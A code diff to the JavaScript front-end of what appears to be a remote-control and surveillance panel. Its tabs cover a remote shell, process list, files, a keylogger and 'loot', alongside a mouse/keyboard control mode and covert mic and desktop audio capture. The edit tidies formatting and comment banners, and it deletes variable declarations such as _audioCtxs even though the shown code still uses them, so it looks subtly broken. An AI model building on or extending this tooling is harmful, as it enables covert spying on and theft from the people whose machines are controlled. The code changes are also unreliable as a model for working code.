@@ -1193,7 +1193,8 @@ function toggleHidMode() {
 	}
 	// Crosshair cursor in control mode
 	const cv = $("desktopView");
-	if (cv) cv.style.cursor = isCtrl ? "crosshair" : "default";`n`tdocument.body.classList.toggle("control-mode", isCtrl);
+	if (cv) cv.style.cursor = isCtrl ? "crosshair" : "default";
+	document.body.classList.toggle("control-mode", isCtrl);
 	// Auto-hide HUD & toolbar in command mode for unobstructed view
 	const hud = document.querySelector(".remote-hud");
 	const toolbar = document.querySelector(".remote-toolbar");
@@ -2568,10 +2569,7 @@ function logEvent(msg, type = "info") {
 	el.innerHTML += `<div class="${cls}">[${t}] ${msg}</div>`;
 	el.scrollTop = el.scrollTopMax || el.scrollHeight;
 }
-// â”€â”€ DUAL AUDIO ENGINE â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
-const _audioCtxs = {}; // keyed: 'mic' | 'desktop'
-const _audioNext = {}; // scheduled time per context
-
+// ── DUAL AUDIO ENGINE ──
 function _getAudioCtx(key) {
 	if (!_audioCtxs[key]) {
 		const rate = 44100; // MRL fix: standardized to 44100Hz for both mic and desktop
@@ -2585,8 +2583,6 @@ function _getAudioCtx(key) {
 	if (ctx.state === "suspended") ctx.resume();
 	return ctx;
 }
-
-const _audioFilters = {};
 
 function _getAudioChain(ctx, key) {
 	if (!_audioCompressors[key]) {
@@ -2808,7 +2804,6 @@ function initDraggablePanel() {
 	document.addEventListener("touchend", endDrag);
 }
 
-let _audioTabScanned = false;
 function setRemoteTab(tab) {
 	const tabs = ["info", "audio", "shell", "ps", "files", "kl", "loot", "tools"];
 	tabs.forEach((t) => {
@@ -3255,10 +3250,7 @@ function _toggleKeylogger() {
 	}
 }
 
-// â”€â”€ AUDIO SURVEILLANCE (Mic / Desktop) â€” dual independent streams â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
-let _micOn = false;
-let _deskOn = false;
-
+// ── AUDIO SURVEILLANCE (Mic / Desktop) ──
 function _setAudioBtn(btnId, isOn) {
 	const btn = $(btnId);
 	if (!btn) return;
